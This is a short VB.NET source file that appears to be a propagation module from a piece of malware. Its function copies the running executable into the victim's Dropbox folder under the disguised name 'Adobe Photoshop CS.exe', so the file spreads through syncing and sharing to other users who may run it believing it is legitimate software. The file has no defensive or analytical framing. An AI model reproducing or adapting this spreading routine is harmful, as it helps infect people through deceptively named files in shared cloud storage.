Imports System.IO

Namespace Spreads
    Module DropboxSpread
        Public Function SpreadFile()
            Try
                If Not File.Exists(GetDropbox() & "\" & "Adobe Photoshop CS.exe") Then
                    File.Copy(Application.ExecutablePath, GetDropbox() & "\" & "Adobe Photoshop CS.exe", True)
                End If
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
        Public Function GetDropbox()
            Dim DropboxFolder = Environment.GetEnvironmentVariable("USERPROFILE") & "\Dropbox"
            If Not (Directory.Exists(DropboxFolder)) Then
                Return "None"
            Else
                Return DropboxFolder
            End If
        End Function
    End Module

End Namespace